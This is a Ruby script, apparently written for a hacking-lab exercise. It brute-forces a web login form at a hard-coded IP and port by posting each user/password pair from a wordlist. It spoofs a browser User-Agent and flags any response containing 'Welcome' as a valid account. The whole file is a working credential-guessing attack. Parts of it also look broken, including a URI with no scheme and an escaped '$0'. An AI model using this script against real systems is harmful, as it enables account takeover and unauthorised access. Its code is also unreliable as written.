require 'net/http'
require 'uri'

# define target url, change as needed
url = URI("94.237.62.195:53749/question1/")

# define a fake headers to present ourself as Chromium browser, change if needed
headers = {
  'User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)'
}

# define the string expected if valid account has been found. our basic PHP example replies with Welcome in case of success
valid = "Welcome"

def unpack(fline)
  # get user
  userid = fline.split(",")[1]

  # if pass could contain a , we should need to handle this in another way
  passwd = fline.split(",")[2]

  return userid, passwd
end

def do_req(url, userid, passwd, headers)
  http = Net::HTTP.new(url.host, url.port)
  request = Net::HTTP::Post.new(url, headers)
  request.set_form_data({'userid' => userid, 'passwd' => passwd, 'submit' => 'submit'})
  response = http.request(request)

  return response.body
end

def check(haystack, needle)
  return haystack.include? needle
end

def main()
  if ARGV.length > 0 && File.file?(ARGV[0])
    fname = ARGV[0]
  else
    puts "[!] Please check wordlist."
    puts "[-] Usage: ruby #{__FILE__} /path/to/wordlist"
    exit
  end

  File.open(fname).each do |fline|
    next if fline.start_with?("#")
    userid, passwd = unpack(fline.chomp)

    puts "[-] Checking account #{userid} #{passwd}"
    res = do_req(url, userid, passwd, headers)

    if check(res, valid)
      puts "[+] Valid account found: userid:#{userid} passwd:#{passwd}"
    end
  end
end

main if __FILE__ == \$0